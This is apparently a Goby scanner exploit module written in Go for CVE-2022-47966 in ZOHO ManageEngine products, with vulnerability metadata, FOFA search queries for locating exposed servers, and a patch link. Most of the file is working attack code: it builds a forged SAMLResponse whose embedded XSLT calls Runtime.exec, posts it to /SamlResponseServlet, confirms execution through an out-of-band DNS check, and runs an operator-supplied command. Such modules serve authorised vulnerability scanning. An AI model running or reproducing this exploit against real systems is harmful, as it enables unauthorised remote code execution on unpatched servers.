package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Multiple ZOHO ManageEngine products SamlResponseServlet RCE Vulnerability(CVE-2022-47966)",
    "Description": "<p>ZOHO ManageEngine ServiceDesk Plus (SDP) is a set of IT service management software based on ITIL architecture of ZOHO in the United States. The software integrates functional modules such as event management, problem management, asset management IT project management, procurement and contract management.</p><p>A number of ZOHO ManageEngine products have security vulnerabilities. The vulnerability stems from the use of Apache xmlsec version 1.4.1 in the products. This version does not provide security protection, and the ManageEngine application does not provide these protections.</p>",
    "Product": "ZOHO-ManageEngine-ServiceDesk",
    "Homepage": "https://www.zohocorp.com/",
    "DisclosureDate": "2023-01-19",
    "Author": "corp0ra1",
    "FofaQuery": "banner=\"Set-Cookie: JSESSIONIDADMP=\" || header=\"Set-Cookie: JSESSIONIDADMP=\" || banner=\"Set-Cookie: SDPSESSIONID=\" || header=\"Set-Cookie: SDPSESSIONID=\" || banner=\"Set-Cookie: UEMJSESSIONID=\" || header=\"Set-Cookie: UEMJSESSIONID=\" || banner=\"Set-Cookie: JSESSIONIDADSSP=\" || header=\"Set-Cookie: JSESSIONIDADSSP=\" || title=\"ManageEngine\" || body=\"ManageEngine\"",
    "GobyQuery": "banner=\"Set-Cookie: JSESSIONIDADMP=\" || header=\"Set-Cookie: JSESSIONIDADMP=\" || banner=\"Set-Cookie: SDPSESSIONID=\" || header=\"Set-Cookie: SDPSESSIONID=\" || banner=\"Set-Cookie: UEMJSESSIONID=\" || header=\"Set-Cookie: UEMJSESSIONID=\" || banner=\"Set-Cookie: JSESSIONIDADSSP=\" || header=\"Set-Cookie: JSESSIONIDADSSP=\" || title=\"ManageEngine\" || body=\"ManageEngine\"",
    "Level": "3",
    "Impact": "<p>A number of ZOHO ManageEngine products have security vulnerabilities. The vulnerability stems from the use of Apache xmlsec version 1.4.1 in the products. This version does not provide security protection, and the ManageEngine application does not provide these protections.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html\">https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html</a></p>",
    "References": [
        "https://github.com/horizon3ai/CVE-2022-47966"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "nslookup yourip",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-47966"
    ],
    "CNNVD": [
        "CNNVD-202301-1466"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "多款 ZOHO ManageEngine 产品 SamlResponseServlet 远程代码执行漏洞（CVE-2022-47966）",
            "Product": "ZOHO-ManageEngine-ServiceDesk",
            "Description": "<p>ZOHO ManageEngine ServiceDesk Plus（SDP）是美国卓豪（ZOHO）公司的一套基于ITIL架构的IT服务管理软件。该软件集成了事件管理、问题管理、资产管理IT项目管理、采购与合同管理等功能模块。<br></p><p>多款ZOHO ManageEngine产品存在安全漏洞，该漏洞源于产品中使用了 Apache xmlsec 1.4.1 版本，在这个版本没有提供安全保护，而 ManageEngine 应用程序也不提供这些保护。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html\">https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html</a><br></p>",
            "Impact": "<p>多款ZOHO ManageEngine产品存在安全漏洞，该漏洞源于产品中使用了 Apache xmlsec 1.4.1 版本，在这个版本没有提供安全保护，而 ManageEngine 应用程序也不提供这些保护。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Multiple ZOHO ManageEngine products SamlResponseServlet RCE Vulnerability(CVE-2022-47966)",
            "Product": "ZOHO-ManageEngine-ServiceDesk",
            "Description": "<p>ZOHO ManageEngine ServiceDesk Plus (SDP) is a set of IT service management software based on ITIL architecture of ZOHO in the United States. The software integrates functional modules such as event management, problem management, asset management IT project management, procurement and contract management.<br></p><p>A number of ZOHO ManageEngine products have security vulnerabilities. The vulnerability stems from the use of Apache xmlsec version 1.4.1 in the products. This version does not provide security protection, and the ManageEngine application does not provide these protections.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html\">https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html</a><br></p>",
            "Impact": "<p>A number of ZOHO ManageEngine products have security vulnerabilities. The vulnerability stems from the use of Apache xmlsec version 1.4.1 in the products. This version does not provide security protection, and the ManageEngine application does not provide these protections.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10708"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)

			//base64Payload := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<samlp:Response\n  ID=\"_eddc1e5f-8c87-4e55-8309-c6d69d6c2adf\"\n  InResponseTo=\"_4b05e414c4f37e41789b6ef1bdaaa9ff\"\n  IssueInstant=\"2023-01-16T13:56:46.514Z\" Version=\"2.0\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">\n  <samlp:Status>\n    <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>\n  </samlp:Status>\n  <Assertion ID=\"_b5a2e9aa-8955-4ac6-94f5-334047882600\"\n    IssueInstant=\"2023-01-16T13:56:46.498Z\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n    <Issuer>issuer</Issuer>\n    <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n      <ds:SignedInfo>\n        <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n        <ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/>\n        <ds:Reference URI=\"#_b5a2e9aa-8955-4ac6-94f5-334047882600\">\n          <ds:Transforms>\n            <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n            <ds:Transform Algorithm=\"http://www.w3.org/TR/1999/REC-xslt-19991116\">\n              <xsl:stylesheet version=\"1.0\"\n                xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n                xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n                <xsl:template match=\"/\">\n                  <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/>\n                  <xsl:variable name=\"process\" select=\"rt:exec($rtobject,'powershell nslookup %s')\"/>\n                  <xsl:variable name=\"processString\" select=\"ob:toString($process)\"/>\n                  <xsl:value-of select=\"$processString\"/>\n                </xsl:template>\n              </xsl:stylesheet>\n            </ds:Transform>\n          </ds:Transforms>\n          <ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/>\n          <ds:DigestValue>H7gKuO6t9MbCJZujA9S7WlLFgdqMuNe0145KRwKl000=</ds:DigestValue>\n        </ds:Reference>\n      </ds:SignedInfo>\n      <ds:SignatureValue>RbBWB6AIP8AN1wTZN6YYCKdnClFoh8GqmU2RXoyjmkr6I0AP371IS7jxSMS2zxFCdZ80kInvgVuaEt3yQmcq33/d6yGeOxZU7kF1f1D/da+oKmEoj4s6PQcvaRFNp+RfOxMECBWVTAxzQiH/OUmoL7kyZUhUwP9G8Yk0tksoV9pSEXUozSq+I5KEN4ehXVjqnIj04mF6Zx6cjPm4hciNMw1UAfANhfq7VC5zj6VaQfz7LrY4GlHoALMMqebNYkEkf2N1kDKiAEKVePSo1vHO0AF++alQRJO47c8kgzld1xy5ECvDc7uYwuDJo3KYk5hQ8NSwvana7KdlJeD62GzPlw==</ds:SignatureValue>\n      <ds:KeyInfo/>\n    </ds:Signature>\n  </Assertion>\n</samlp:Response>\n", checkUrl)))
			base64Payload := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?> <samlp:Response ID=\"_eddc1e5f-8c87-4e55-8309-c6d69d6c2adf\" InResponseTo=\"_4b05e414c4f37e41789b6ef1bdaaa9ff\" IssueInstant=\"2023-01-16T13:56:46.514Z\" Version=\"2.0\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"> <samlp:Status> <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/> </samlp:Status> <Assertion ID=\"_b5a2e9aa-8955-4ac6-94f5-334047882600\" IssueInstant=\"2023-01-16T13:56:46.498Z\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <Issuer>a</Issuer> <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"> <ds:SignedInfo> <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> <ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/> <ds:Reference URI=\"#_b5a2e9aa-8955-4ac6-94f5-334047882600\"> <ds:Transforms> <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> <ds:Transform Algorithm=\"http://www.w3.org/TR/1999/REC-xslt-19991116\"> <xsl:stylesheet version=\"1.0\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/\"> <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/> <xsl:variable name=\"process\" select=\"rt:exec($rtobject,&quot;%s&quot;)\"/> <xsl:variable name=\"processString\" select=\"ob:toString($process)\"/> <xsl:value-of select=\"$processString\"/> </xsl:template> </xsl:stylesheet> </ds:Transform> </ds:Transforms> <ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/> <ds:DigestValue>H7gKuO6t9MbCJZujA9S7WlLFgdqMuNe0145KRwKl000=</ds:DigestValue> </ds:Reference> </ds:SignedInfo> <ds:SignatureValue>RbBWB6AIP8AN1wTZN6YYCKdnClFoh8GqmU2RXoyjmkr6I0AP371IS7jxSMS2zxFCdZ80kInvgVuaEt3yQmcq33/d6yGeOxZU7kF1f1D/da+oKmEoj4s6PQcvaRFNp+RfOxMECBWVTAxzQiH/OUmoL7kyZUhUwP9G8Yk0tksoV9pSEXUozSq+I5KEN4ehXVjqnIj04mF6Zx6cjPm4hciNMw1UAfANhfq7VC5zj6VaQfz7LrY4GlHoALMMqebNYkEkf2N1kDKiAEKVePSo1vHO0AF++alQRJO47c8kgzld1xy5ECvDc7uYwuDJo3KYk5hQ8NSwvana7KdlJeD62GzPlw==</ds:SignatureValue> <ds:KeyInfo/> </ds:Signature> </Assertion> </samlp:Response>","nslookup "+checkUrl)))
			uri := "/SamlResponseServlet"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "SAMLResponse=" + url.QueryEscape(base64Payload)+"&RelayState="
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil &&resp.StatusCode == 500 && strings.Contains(resp.RawBody,"Unknown error occurred while processing your request"){
				return godclient.PullExists(checkStr, time.Second*20)
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			base64Payload := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?> <samlp:Response ID=\"_eddc1e5f-8c87-4e55-8309-c6d69d6c2adf\" InResponseTo=\"_4b05e414c4f37e41789b6ef1bdaaa9ff\" IssueInstant=\"2023-01-16T13:56:46.514Z\" Version=\"2.0\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"> <samlp:Status> <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/> </samlp:Status> <Assertion ID=\"_b5a2e9aa-8955-4ac6-94f5-334047882600\" IssueInstant=\"2023-01-16T13:56:46.498Z\" Version=\"2.0\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\"> <Issuer>a</Issuer> <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"> <ds:SignedInfo> <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> <ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/> <ds:Reference URI=\"#_b5a2e9aa-8955-4ac6-94f5-334047882600\"> <ds:Transforms> <ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> <ds:Transform Algorithm=\"http://www.w3.org/TR/1999/REC-xslt-19991116\"> <xsl:stylesheet version=\"1.0\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/\"> <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/> <xsl:variable name=\"process\" select=\"rt:exec($rtobject,&quot;%s&quot;)\"/> <xsl:variable name=\"processString\" select=\"ob:toString($process)\"/> <xsl:value-of select=\"$processString\"/> </xsl:template> </xsl:stylesheet> </ds:Transform> </ds:Transforms> <ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/> <ds:DigestValue>H7gKuO6t9MbCJZujA9S7WlLFgdqMuNe0145KRwKl000=</ds:DigestValue> </ds:Reference> </ds:SignedInfo> <ds:SignatureValue>RbBWB6AIP8AN1wTZN6YYCKdnClFoh8GqmU2RXoyjmkr6I0AP371IS7jxSMS2zxFCdZ80kInvgVuaEt3yQmcq33/d6yGeOxZU7kF1f1D/da+oKmEoj4s6PQcvaRFNp+RfOxMECBWVTAxzQiH/OUmoL7kyZUhUwP9G8Yk0tksoV9pSEXUozSq+I5KEN4ehXVjqnIj04mF6Zx6cjPm4hciNMw1UAfANhfq7VC5zj6VaQfz7LrY4GlHoALMMqebNYkEkf2N1kDKiAEKVePSo1vHO0AF++alQRJO47c8kgzld1xy5ECvDc7uYwuDJo3KYk5hQ8NSwvana7KdlJeD62GzPlw==</ds:SignatureValue> <ds:KeyInfo/> </ds:Signature> </Assertion> </samlp:Response>","nslookup "+cmd)))
			uri := "/SamlResponseServlet"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "SAMLResponse=" + url.QueryEscape(base64Payload)
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = "命令已执行"
				expResult.Success = true
			}
			return expResult
		},
	))
}